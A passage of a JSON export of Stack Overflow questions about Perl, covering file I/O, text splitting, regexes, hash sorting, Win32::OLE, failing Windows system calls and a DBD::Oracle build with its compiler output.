XML::LibXML;\n\nmy $xml = XML::LibXML-&gt;load_xml( string =&gt; &lt;&lt;'XMLDOC' );\n&lt;alphabet&gt;\n &lt;child name='alpha'/&gt;\n &lt;child name='bravo'/&gt;\n &lt;child name='charlie'/&gt;\n &lt;child name='delta'/&gt;\n &lt;child name='echo'/&gt;\n&lt;/alphabet&gt;\nXMLDOC\n\nmy ( $parent ) = $xml-&gt;findnodes( '/alphabet' );\n\nmy @all_kids  = $parent-&gt;childNodes;\nmy @real_kids = $parent-&gt;nonBlankChildNodes;\n\nsay 'All kids : ', scalar @all_kids;   # '11'\nsay 'Real kids : ', scalar @real_kids; # '5' =&gt; 6 blank child nodes\n</code></pre>\n\n<p>What puzzles me is that the parser makes a distinction between retrieving all child nodes and only non-blank ones.</p>\n\n<p>It would seem then that there must be at least one sane use for these blank nodes. It would be interesting to know exactly what those uses are.</p>\n"},{"tags":["perl","file","path","directories","outfile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12813873,"title":"Perl - Print output to files in a different directory","body":"<p>Good morning!</p>\n\n<p>I am sorry if this has been posted before - I could not find it. I just need a little point into the right direction, this is my homework and I feel it is almost done. What I want to do is take data from files in a different folder from where the script is run, process the data inside Perl, then print the output to another directory. Now I got the two parts done, but what I fail with is that Perl does not find the path to where I want to save the files. It just sais \"No file or directory with that names exists\", but it does! Here is the part of the script for that:</p>\n\n<pre><code>my @files = &lt;$ENV{HOME}/Docs/unprocessed/*.txt&gt;;\nmy $path = \"$ENV{HOME}/Docs/results\";\n\n&lt;looping through @files, processing each file in the unprocessed folder...&gt;\n\nopen (OUTFILE, $path . '&gt;$file') or die $!;\nprint OUTFILE \"\"; # \"\" Is really the finished calculations from the loop, not important here.\nclose FILE;\nclose OUTFILE;\n</code></pre>\n\n<p>I bet its something stupid...</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12813317,"title":"Text file Operation in Perl","body":"<p>I have a text file that looks like this: </p>\n\n<pre><code>Id:001;status:open;Id:002;status:open;Id:003;status:closed;\nId:004;status:open;Id:005;status:closed;Id:006;status:open;\n.... \n....\n</code></pre>\n\n<p>Here is my code: </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nopen IN, \"&lt;\", \"ABC.txt\" \n    or die\"Can not open the file $!\";\n\nmy @split_line;           \nwhile(my $line = &lt;IN&gt;) {\n\n    @split_line = split /;/, $line;\n\n    for (my $i = 0; $i &lt;= $#split_line; $i++) {\n\n        print \"$split_line[$i]\".\" \".\"$split_line[$i+1]\\n\";  \n    }\n} \n</code></pre>\n\n<p><strong>Actual o/p:</strong></p>\n\n<pre><code>Id:001 status:open\nstatus:open Id:002\nId:002 status:open\nstatus:open Id:003\nId:003 status:closed\nstatus:closed \n......\n......\n</code></pre>\n\n<p><strong>Expected o/p is:</strong> </p>\n\n<pre><code>Id:001      status:open\nId:002      status:open\n.....\n....\n</code></pre>\n\n<p>I have no idea why it outputs the other lines. Can any body give help me with this? </p>\n\n<p>Hey I am so sorry, for this but I have to modify the Output: </p>\n\n<p>Actually the output is now like </p>\n\n<pre><code>**Id        Status**\n001       open\n002       open\n...\n</code></pre>\n\n<p>Can some one please help me out here?</p>\n"},{"tags":["perl","join"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12818101,"title":"Join function not working","body":"<p>Below script break the sequence at every 'E' and subsequently an 'E' is added on to each fragment. But I'm not getting 'E' attached to my last element, Why?</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $s = 'ABCDEABCDEABCDEABCDEABCDE';\nmy @a = split /E(?!P)/, $s;\n\nmy $result = join \"E,\", @a; \nmy @final  = split /,/, $result;\nprint \"@final\\n\";\n</code></pre>\n"},{"tags":["perl","require","use"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":6514961,"title":"Why LWP::UserAgent is imported by require LWP::UserAgent instead of use LWP::UserAgent?","body":"<p>I'm pretty new to this language but I've been using <code>use</code> to import a specific module before,</p>\n\n<p>why <code>LWP::UserAgent</code> uses <code>require</code> to do the job as from <code>perldoc LWP::UserAgent</code>:</p>\n\n<pre><code>require LWP::UserAgent;\n</code></pre>\n"},{"tags":["windows","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":290,"score":9,"question_id":11084463,"title":"What could cause Perl system calls to start failing?","body":"<p>A small request: I read Stack Overflow's Perl questions every day, and answer/contribute where I can; today I need the community's help!</p>\n\n<p>Perl setup: I'm running Active Perl 5.8.8 on Windows.  The installation is on our department server's local drive, which is also shared to the network.  All department users run Perl on their own PCs by pointing to this network-installed Perl.  This has worked for years, and isn't causing a problem, but it's a piece of info needed to understand the problem.</p>\n\n<p>The server in question is also our \"cron\" (Scheduled Task) server, handling a variety of automation tasks.  Suddenly last week, system calls in Perl scripts (on the server) started failing (details below).  At first, I suspected a corrupt Perl installation, but all of the client PCs can still run the same Perl scripts without any issues, leading me to think it's a server issue.  I've rebooted the server twice, and the problem is persistent, thus I need help!</p>\n\n<p>Here are some examples of the various way that system calls are failing, boiled down to Perl one-liners:</p>\n\n<pre><code>% perl -e \"system('dir')\"\n</code></pre>\n\n<p>That should print a \"dir\" listing, but instead it opens a sub-shell.  If I type \"exit\", I can exit the sub-shell, and I'm back in the original shell (confirmed by examining the shell history using the UP arrow key).</p>\n\n<pre><code>% perl -e \"print `dir`\"\n</code></pre>\n\n<p>This actually hangs.  Nothing happens at all.  If I Ctrl-C to kill the process, I get the message \"Terminating on signal SIGINT(2)\" and the DOS prompt comes back.  But, any future commands in the DOS prompt (even just hitting ENTER) cause the error \"The process tried to write to a nonexistent pipe.\".  You have to exit the DOS prompt as it's effectively useless.</p>\n\n<p>Last example:</p>\n\n<pre><code>% perl -e \"system('Z:/Scripts/rebuild.pl')\"\n</code></pre>\n\n<p>'ebuild.pl' is not recognized as an internal or external command,\noperable program or batch file.</p>\n\n<p>In this case, Perl switches the forward-slashes (/) to DOS/Windows back-slashes (), which it has done just fine for years.  But, Perl is interpreting the \"\\r\" at the beginning of the \"rebuild.pl\" filename as a carriage-return (I think) and looking for the remaining \"ebuild.pl\".  Calls to other scriptnames whose characters can't be misinterpreted like that result in the above hangs (if you use backticks) of sub-shells being opened (for system() calls).</p>\n\n<p>I'm not just puzzled by this - I'm desperate!  Our department server's \"cron\" jobs are useless right now since we use a lot of system calls.</p>\n\n<p>Again, I don't think this is a corrupt Perl install, since the network users can run fine.  So, what could happen on an individual machine (not tied to the Perl install itself) that could cause Perl's system calls to fail like this?</p>\n\n<p>Environment settings, as requested:</p>\n\n<pre><code>ALLUSERSPROFILE=C:\\Documents and Settings\\All Users\nAPPDATA=C:\\Documents and Settings\\engmodem\\Application Data\nCDSROOT=Z:\\Cadence\\SPB_16.5\nCDS_CONCEPT_NOSPLASH=TRUE\nCDS_LIC_ONLY=1\nCDS_SITE=Z:\\Cadence\\Sites\\16.5\nCHDL_LIB_INST_DIR=%CDSROOT%\nCLIENTNAME=USENTUTTLJL3C\nClusterLog=C:\\WINDOWS\\Cluster\\cluster.log\nCommonProgramFiles=C:\\Program Files\\Common Files\nCOMPUTERNAME=CORPUSAPP5\nComSpec=C:\\WINDOWS\\system32\\cmd.exe\nCONCEPT_INST_DIR=%CDSROOT%\nFP_NO_HOST_CHECK=NO\nHOMEDRIVE=H:\nHOMEPATH=\\\nHOMESHARE=\\\\PF1\\HOME\nICMHOME=Z:\\Software\\PTC\\INTERC~1\nINSTDIR=%CDSROOT%\nLOGONSERVER=\\\\ENGMAHO5\nLSF_BINDIR=Z:\\Software\\LSF\\bin\nLSF_ENVDIR=\\\\hwc151\\LSF_6.2\\etc\nMESSAGE=BROADCAST\nNUMBER_OF_PROCESSORS=2\nOA_PLUGIN_PATH=%CDSROOT%\\Share\\oaPlugIns\nOS=Windows_NT\nPath=C:\\Program Files\\Legato\\nsr\\bin;Z:\\oracle\\ora92\\bin;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\Program Files\\Windows Resource Kits\\Tools\\;Z:\\Software\\Perl\\5.8.8\\bin;C:\\Program Files\\Oracle\\jre\\1.3.1\\bin;C:\\Program Files\\Oracle\\jre\\1.1.8\\bin;C:\\Program Files\\Support Tools\\;Z:\\Software\\LSF\\bin;C:\\Program Files\\PHP\\;C:\\Program Files\\Microsoft SQL Server\\90\\Tools\\binn\\;C:\\Program Files\\EMC RepliStor;C:\\GitStack\\python;C:\\GitStack\\python\\Scripts;C:\\GitStack\\git\\cmd;Z:\\Scripts;Z:\\bin;Z:\\Cadence\\SPB_16.5\\tools\\bin;Z:\\Cadence\\SPB_16.5\\tools\\fet\\bin;Z:\\Cadence\\SPB_16.5\\tools\\pcb\\bin;Z:\\Cadence\\SPB_16.5\\OpenAccess\\bin\\win32\\opt\nPATHEXT=.COM;.EXE;.BAT;.PL;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.VBS\nPCB_LIBRARY=16\nPERL5SHELL=cmd\nPHPRC=C:\\Program Files\\PHP\\\nPROCESSOR_ARCHITECTURE=x86\nPROCESSOR_IDENTIFIER=x86 Family 6 Model 29 Stepping 1, GenuineIntel\nPROCESSOR_LEVEL=6\nPROCESSOR_REVISION=1d01\nProgramFiles=C:\\Program Files\nPROMPT=$P$G\nPULLUP_DIFF_PAIRS=TRUE\nSESSIONNAME=RDP-Tcp#1\nSystemDrive=C:\nSystemRoot=C:\\WINDOWS\nTZ=EST5EDT\nVISUALSVN_SERVER=C:\\Program Files\\VisualSVN Server\\\nWF_RESOURCES=Z:\\oracle\\ora92\\WF\\RES\\WFus.RES\nwindir=C:\\WINDOWS\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12817645,"title":"Pull part of string using regExp in perl","body":"<p>Small question regrading taking part of string.\nmy string is </p>\n\n<blockquote>\n  <p>some text here value: 100 .1.3.6 bla bla.</p>\n</blockquote>\n\n<p>I would like to save the first part of the sting till the .1.3.......</p>\n\n<p>so at the end ill have only </p>\n\n<blockquote>\n  <p>some text here value: 100</p>\n</blockquote>\n"},{"tags":["perl","sorting","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12790891,"title":"Perl sorting hash by values in the hash","body":"<p>I think I have the right idea but there's some syntax/convention thing I'm messing up, because I get the error \"Global symbol %timeHash requires explicit package name\".</p>\n\n<p>Code:</p>\n\n<pre><code>foreach $key (sort hashValueDescendingNum (keys(%timeHash))) {\n   print \"\\t$key\\t\\t $timeHash{$key}\\n\";\n}\n\n\n\nsub hashValueDescendingNum {\n   my $hash = shift;\n   $hash{$b} &lt;=&gt; $hash{$a};\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":12810629,"title":"Perl Win32::OLE Word Cell Text","body":"<p>Text is getting truncated.  I have coded the cell range and text option as documented, but the first character of each cell is truncated and only the very last sentence of each cell is printed.  Not sure if this has anything to do with cell formatting, but some of the cells have right alignment.</p>\n\n<p>Any help would be great...here is the code</p>\n\n<pre><code>use warnings;  \nuse strict;\nuse Win32::OLE qw(in with);\nuse Win32::OLE::Const 'Microsoft Word';\nuse Win32::OLE::Variant;\nmy $txt = \"\";\nmy $var1 = Win32::OLE::Variant-&gt;new(VT_BOOL, 'true');\n\n# we are going be working with MS Word Objects\n$Win32::OLE::Warn = 3; \n\n# get already active Excel application or open new\nmy $Word = Win32::OLE-&gt;GetActiveObject('Word.Application')\n    || Win32::OLE-&gt;new('Word.Application', 'Quit');  \n\n# open Excel file\nmy $Book = $Word-&gt;Documents-    &gt;Open(\"http://classroom.kleinisd.net/webs/lbalthazar/upload/2nd_six_weeks_calendar.docx\"); \n\n#$Word-&gt;{Visible}= 0; # we don't need to see Word in an active window\n\n# get the first table\nmy $table = $Word-&gt;ActiveDocument-&gt;Tables(1);\nforeach my $row (1..4)\n{\nforeach my $col (1..5)\n {\n$txt = $table-&gt;Cell($row,$col)-&gt;Range-&gt;{Text};\nprint \"$txt \\n\";\n}\n}\nprint \"Closing document and Word\\n\";\n#$Word-&gt;ActiveDocument-&gt;Close();\n$Word-&gt;Quit;\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12816543,"title":"Txt file Output in tabular form","body":"<p>Actually this question is a copy of <code>http://stackoverflow.com/questions/12813317/text-file-operation-in-perl</code>  this. But here I am trying to print some diff o/p as suggested by my Boss :( </p>\n\n<p>Can i  expect any help? :) </p>\n\n<p>I have a text file in which blow is the data : </p>\n\n<pre><code>Id:001;status:open;Name:AB;Id:002;status:open;Name:AB;Id:003;status:closed;Name:BC;\nId:004;status:open;Name:AB;Id:005;status:closed;Name:BB;Id:006;status:open;Name:CD;\n.... \n....\n</code></pre>\n\n<p>here is my code: </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nopen IN, \"&lt;\", \"ABC.txt\" \n    or die\"Can not open the file $!\";\n\nmy @split_line;           \nwhile(my $line = &lt;IN&gt;) {\n\n    @split_line = split /;/, $line;\n\n    for (my $i = 0; $i &lt;= $#split_line; $i += 2) {\n\n        print \"$split_line[$i]\".\" \".\"$split_line[$i+1]\\n\";  \n    }\n}\n</code></pre>\n\n<p>Actual o/p:</p>\n\n<pre><code>Id:001      status:open    Name:AB\nId:002      status:open    Name:AB\n</code></pre>\n\n<p>Expected O/p</p>\n\n<pre><code>Id         Status    Name\n001        open      AC\n002        open      AB\n003        close     BC\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12812332,"title":"validate 32bit integer with regex","body":"<p>I'm trying to come up with a regex that will match anything that is not a 32bit integer. My eventual goal is to match lines that are not in the following format </p>\n\n<pre><code>Integer\\tInteger\\tInteger\\tInteger\\tInteger\\tInteger\\tInteger\n</code></pre>\n\n<p>(7 32bit integers and 1 tab in between each integer)</p>\n\n<p>So far I've come up with this</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nwhile ( my $line = &lt;&gt; ) {\n\n    if ( $line =~ /^(429496729[0-6]|42949672[0-8]\\d|4294967[01]\\d{2}|429496[0-6]\\d{3}|42949[0-5]\\d{4}|4294[0-8]\\d{5}|429[0-3]\\d{6}|42[0-8]\\d{7}|4[01]\\d{8}|[1-3]\\d{9}|[1-9]\\d{8}|[1-9]\\d{7}|[1-9]\\d{6}|[1-9]\\d{5}|[1-9]\\d{4}|[1-9]\\d{3}|[1-9]\\d{2}|[1-9]\\d|\\d)$/ ) {\n\n        print \"Match at line $.\\n\";\n        print \"$line\"\n    }\n\n}\n</code></pre>\n\n<p>But I can't even get to the first step of having the regex match a 32bit numbers (once I tackle that problem I can tackle having the tabs be the way they need to be)</p>\n\n<p>Am I solving this problem the right way? Any thoughts?</p>\n"},{"tags":["perl","oracle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":12811131,"title":"perl-DBI / perl-DBD-oracle installation","body":"<p>What I want to do is connecting and retrieving data from oracle database through perl.</p>\n\n<p>What i did(as oracle account) is like below.....</p>\n\n<pre><code>$ rpm -qa|grep DBI\nperl-DBI-1.52-2.el5\n\n$ wget http://search.cpan.org/CPAN/authors/id/P/PY/PYTHIAN/DBD-Oracle-1.17.tar.gz\n$ tar -zxf DBD-Oracle-1.17.tar.gz\n$ cd DBD-Oracle-1.17\n$ perl Makefile.PL\nUsing DBI 1.52 (for perl 5.008008 on x86_64-linux-thread-multi) installed in /usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI/\n\nConfiguring DBD::Oracle for perl 5.008008 on linux (x86_64-linux-thread-multi)\n\nRemember to actually *READ* the README file! Especially if you have any problems.\n\nUsing Oracle in /sw/oracle/app/oracle/product/102\nDEFINE _SQLPLUS_RELEASE = \"1002000500\" (CHAR)\nOracle version 10.2.0.5 (10.2)\nFound /sw/oracle/app/oracle/product/102/rdbms/demo/demo_rdbms.mk\nUsing /sw/oracle/app/oracle/product/102/rdbms/demo/demo_rdbms.mk\nYour LD_LIBRARY_PATH env var is set to '/sw/oracle/app/oracle/product/102/lib:/usr/lib:/sw/oracle/app/oracle/product/102/lib32:.'\nReading /sw/oracle/app/oracle/product/102/rdbms/demo/demo_rdbms.mk\nReading /sw/oracle/app/oracle/product/102/rdbms/lib/env_rdbms.mk\n\nAttempting to discover Oracle OCI build rules\ngcc    -c -o DBD_ORA_OBJ.o DBD_ORA_OBJ.c\nby executing: [make -f /sw/oracle/app/oracle/product/102/rdbms/demo/demo_rdbms.mk build ECHODO=echo ECHO=echo GENCLNTSH='echo genclntsh' CC=true OPTIMIZE= CCFLAGS= EXE=DBD_ORA_EXE OBJS=DBD_ORA_OBJ.o]\nOracle oci build command:\n    [true -L/sw/oracle/app/oracle/product/102/lib/ -L/sw/oracle/app/oracle/product/102/rdbms/lib/ -o DBD_ORA_EXE DBD_ORA_OBJ.o -lclntsh   `cat /sw/oracle/app/oracle/product/102/lib/sysliblist` -ldl -lm  -lpthread]\n\nFound header files in /sw/oracle/app/oracle/product/102/rdbms/public.\n\nChecking for functioning wait.ph\nConstant subroutine __USE_POSIX undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 8.\nConstant subroutine __USE_POSIX2 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 9.\nConstant subroutine __USE_POSIX199309 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 10.\nConstant subroutine __USE_POSIX199506 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 11.\nConstant subroutine __USE_XOPEN undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 12.\nConstant subroutine __USE_XOPEN_EXTENDED undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 13.\nConstant subroutine __USE_UNIX98 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 14.\nConstant subroutine __USE_LARGEFILE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 16.\nConstant subroutine __USE_LARGEFILE64 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 17.\nConstant subroutine __USE_FILE_OFFSET64 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 18.\nConstant subroutine __USE_BSD undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 19.\nConstant subroutine __USE_SVID undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 20.\nConstant subroutine __USE_MISC undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 21.\nConstant subroutine __USE_GNU undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 23.\nConstant subroutine __USE_REENTRANT undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 24.\nConstant subroutine _POSIX_SOURCE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 49.\nConstant subroutine _POSIX_C_SOURCE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 51.\nConstant subroutine _XOPEN_SOURCE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 53.\nConstant subroutine _XOPEN_SOURCE_EXTENDED undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 55.\nConstant subroutine _LARGEFILE64_SOURCE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 57.\nConstant subroutine _LARGEFILE_SOURCE undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 104.\nConstant subroutine __USE_ISOC99 undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 108.\nConstant subroutine __GNU_LIBRARY__ undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/features.ph line 156.\nOperator or semicolon missing before &amp;__inline at (eval 167) line 1.\nAmbiguous use of &amp; resolved as operator &amp; at (eval 167) line 1.\nConstant subroutine __need_size_t undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/stddef.ph line 148.\nScalar found where operator expected at (eval 241) line 1, near \"'int'  $__val\"\n    (Missing operator before   $__val?)\nNumber found where operator expected at (eval 245) line 1, near \") 0\"\n    (Missing operator before 0?)\nNumber found where operator expected at (eval 246) line 1, near \") 1\"\n    (Missing operator before 1?)\nNumber found where operator expected at (eval 247) line 1, near \") 2\"\n    (Missing operator before 2?)\nConstant subroutine __need_timespec undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/time.ph line 49.\nHexadecimal number &gt; 0xffffffff non-portable at (eval 447) line 1.\nHexadecimal number &gt; 0xffffffff non-portable at (eval 448) line 1.\nConstant subroutine __need_timeval undefined at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/bits/time.ph line 23.\n\n\nSystem: perl5.008008 linux builder10.centos.org 2.6.18-53.el5 #1 smp mon nov 12 02:14:55 est 2007 x86_64 x86_64 x86_64 gnulinux \nCompiler:   gcc -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic -D_REENTRANT -D_GNU_SOURCE -fno-strict-aliasing -pipe -Wdeclaration-after-statement -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -I/usr/include/gdbm\nLinker:     /usr/bin/ld\nSysliblist: -ldl -lm -lpthread -lnsl -lirc \nOracle makefiles would have used these definitions but we override them:\n  CC:       $(COMPDIR)/bin/gcc\n  CFLAGS:   $(GFLAG) $(OPTIMIZE) $(CDEBUG) $(CCFLAGS) $(PFLAGS)\\\n    $(SHARED_CFLAG) $(USRFLAGS)\n           [$(GFLAG) -O3 $(CDEBUG) -m32 -trigraphs -fPIC -I/sw/oracle/app/oracle/product/102/rdbms/demo -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/plsql/public -I/sw/oracle/app/oracle/product/102/network/public -DLINUX -D_GNU_SOURCE -D_LARGEFILE64_SOURCE=1 -D_LARGEFILE_SOURCE=1 -DSLTS_ENABLE -DSLMXMX_ENABLE -D_REENTRANT -DNS_THREADS -fno-strict-aliasing $(LPFLAGS) $(USRFLAGS)]\n  LDFLAGS:  $(LDFLAGS32)\n           [-m32 -o $@ -L/sw/oracle/app/oracle/product/102/rdbms//lib32/ -L/sw/oracle/app/oracle/product/102/lib32/ -L/sw/oracle/app/oracle/product/102/lib32/stubs/]\nLinking with OTHERLDFLAGS = -L/sw/oracle/app/oracle/product/102/lib/ -L/sw/oracle/app/oracle/product/102/rdbms/lib/   -lclntsh   `cat /sw/oracle/app/oracle/product/102/lib/sysliblist` -ldl -lm  -lpthread [from 'build' rule]\n\nChecking if your kit is complete...\nLooks good\nLD_RUN_PATH=/sw/oracle/app/oracle/product/102/lib:/sw/oracle/app/oracle/product/102/rdbms/lib\nUsing DBD::Oracle 1.17.\nUsing DBD::Oracle 1.17.\nUsing DBI 1.52 (for perl 5.008008 on x86_64-linux-thread-multi) installed in /usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI/\nWriting Makefile for DBD::Oracle\n\n***  If you have problems...\n     read all the log printed above, and the README and README.help.txt files.\n     (Of course, you have read README by now anyway, haven't you?)\n\n$ make\ncp Oracle.pm blib/lib/DBD/Oracle.pm\ncp oraperl.ph blib/lib/oraperl.ph\ncp dbdimp.h blib/arch/auto/DBD/Oracle/dbdimp.h\ncp ocitrace.h blib/arch/auto/DBD/Oracle/ocitrace.h\ncp Oraperl.pm blib/lib/Oraperl.pm\ncp Oracle.h blib/arch/auto/DBD/Oracle/Oracle.h\ncp lib/DBD/Oracle/GetInfo.pm blib/lib/DBD/Oracle/GetInfo.pm\ncp mk.pm blib/arch/auto/DBD/Oracle/mk.pm\n/usr/bin/perl -p -e \"s/~DRIVER~/Oracle/g\" /usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI/Driver.xst &gt; Oracle.xsi\n/usr/bin/perl /usr/lib/perl5/5.8.8/ExtUtils/xsubpp  -typemap /usr/lib/perl5/5.8.8/ExtUtils/typemap -typemap typemap  Oracle.xs &gt; Oracle.xsc &amp;&amp; mv Oracle.xsc Oracle.c\ngcc -c  -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/rdbms/demo -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/plsql/public -I/sw/oracle/app/oracle/product/102/network/public -I/usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI -D_REENTRANT -D_GNU_SOURCE -fno-strict-aliasing -pipe -Wdeclaration-after-statement -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -I/usr/include/gdbm -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic   -DVERSION=\\\"1.17\\\" -DXS_VERSION=\\\"1.17\\\" -fPIC \"-I/usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/CORE\"  -Wall -Wno-comment -DUTF8_SUPPORT -DNEW_OCI_INIT -DORA_OCI_VERSION=\\\"10.2.0.5\\\" Oracle.c\nOracle.c: In function 'XS_DBD__Oracle__db_ora_lob_append':\nOracle.xs:201: warning: unused variable 'startp'\ngcc -c  -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/rdbms/demo -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/plsql/public -I/sw/oracle/app/oracle/product/102/network/public -I/usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI -D_REENTRANT -D_GNU_SOURCE -fno-strict-aliasing -pipe -Wdeclaration-after-statement -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -I/usr/include/gdbm -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic   -DVERSION=\\\"1.17\\\" -DXS_VERSION=\\\"1.17\\\" -fPIC \"-I/usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/CORE\"  -Wall -Wno-comment -DUTF8_SUPPORT -DNEW_OCI_INIT -DORA_OCI_VERSION=\\\"10.2.0.5\\\" dbdimp.c\ndbdimp.c: In function 'ora_db_login6':\ndbdimp.c:652: warning: value computed is not used\ndbdimp.c: In function 'dbd_rebind_ph_char':\ndbdimp.c:1052: warning: value computed is not used\ngcc -c  -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/rdbms/demo -I/sw/oracle/app/oracle/product/102/rdbms/public -I/sw/oracle/app/oracle/product/102/plsql/public -I/sw/oracle/app/oracle/product/102/network/public -I/usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi/auto/DBI -D_REENTRANT -D_GNU_SOURCE -fno-strict-aliasing -pipe -Wdeclaration-after-statement -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -I/usr/include/gdbm -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic   -DVERSION=\\\"1.17\\\" -DXS_VERSION=\\\"1.17\\\" -fPIC \"-I/usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/CORE\"  -Wall -Wno-comment -DUTF8_SUPPORT -DNEW_OCI_INIT -DORA_OCI_VERSION=\\\"10.2.0.5\\\" oci8.c\noci8.c: In function 'fetch_func_rset':\noci8.c:626: warning: value computed is not used\noci8.c: In function 'dbd_rebind_ph_lob':\noci8.c:711: warning: value computed is not used\noci8.c: In function 'ora_blob_read_mb_piece':\noci8.c:778: warning: comparison is always false due to limited range of data type\noci8.c: In function 'ora_describe':\noci8.c:1267: warning: comparison is always false due to limited range of data type\noci8.c: In function 'post_execute_lobs':\noci8.c:2118: warning: value computed is not used\noci8.c: At top level:\noci8.c:563: warning: 'fetch_func_nty' defined but not used\nRunning Mkbootstrap for DBD::Oracle ()\nchmod 644 Oracle.bs\nrm -f blib/arch/auto/DBD/Oracle/Oracle.so\ngcc  -shared -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic Oracle.o dbdimp.o oci8.o -L/sw/oracle/app/oracle/product/102/lib/ -L/sw/oracle/app/oracle/product/102/rdbms/lib/   -lclntsh   `cat /sw/oracle/app/oracle/product/102/lib/sysliblist` -ldl -lm  -lpthread -o blib/arch/auto/DBD/Oracle/Oracle.so    \\\n            \\\n\nchmod 755 blib/arch/auto/DBD/Oracle/Oracle.so\ncp Oracle.bs blib/arch/auto/DBD/Oracle/Oracle.bs\nchmod 644 blib/arch/auto/DBD/Oracle/Oracle.bs\n/usr/bin/perl 